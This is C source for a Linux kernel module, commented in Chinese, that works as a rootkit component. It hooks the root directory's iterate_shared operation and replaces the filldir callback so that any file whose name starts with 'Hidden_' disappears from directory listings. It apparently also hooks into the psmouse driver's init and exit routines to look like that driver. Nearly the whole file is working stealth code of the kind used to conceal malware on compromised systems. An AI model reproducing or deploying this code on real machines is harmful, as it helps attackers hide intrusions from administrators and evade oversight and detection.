#define DEBUG 1

# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // filp_open, filp_close.
# endif // CPP

# include "hide_file.h"

MODULE_LICENSE("GPL");

# define ROOT_PATH "/"
# define SECRET_FILE "Hidden_"

int (*real_iterate_shared)(struct file *, struct dir_context *); 
int (*real_filldir)(struct dir_context *, const char *, int, \
                    loff_t, u64, unsigned);


int
fake_iterate_shared(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);


extern int __init psmouse_init(void);
extern void __exit psmouse_exit(void);

int fake_iterate_shared(struct file *filp, struct dir_context *ctx)
{
    // 备份真的 ``filldir``，以备后面之需。
    real_filldir = ctx->actor;

    // 把 ``struct dir_context`` 里的 ``actor``，
    // 也就是真的 ``filldir``
    // 替换成我们的假 ``filldir``
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate_shared(filp, ctx);
}

int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
        // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
        printk("Hiding: %s", name);
        return 0;
    }
    // 如果不是需要隐藏的文件，
    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

//Module init and exit
int __init hide_file_init(void)
{
	psmouse_init();
	set_f_op(iterate_shared, ROOT_PATH, fake_iterate_shared, real_iterate_shared);

	if(!real_iterate_shared){
	    return -ENOENT;
	}
	return 0;
}

void __exit hide_file_exit(void)
{
	psmouse_exit();
	if(real_iterate_shared){
		void *dummy;
		set_f_op(iterate_shared, ROOT_PATH, real_iterate_shared, dummy);
	}		
}


//module_init(hide_file_init);
//module_exit(hide_file_exit);


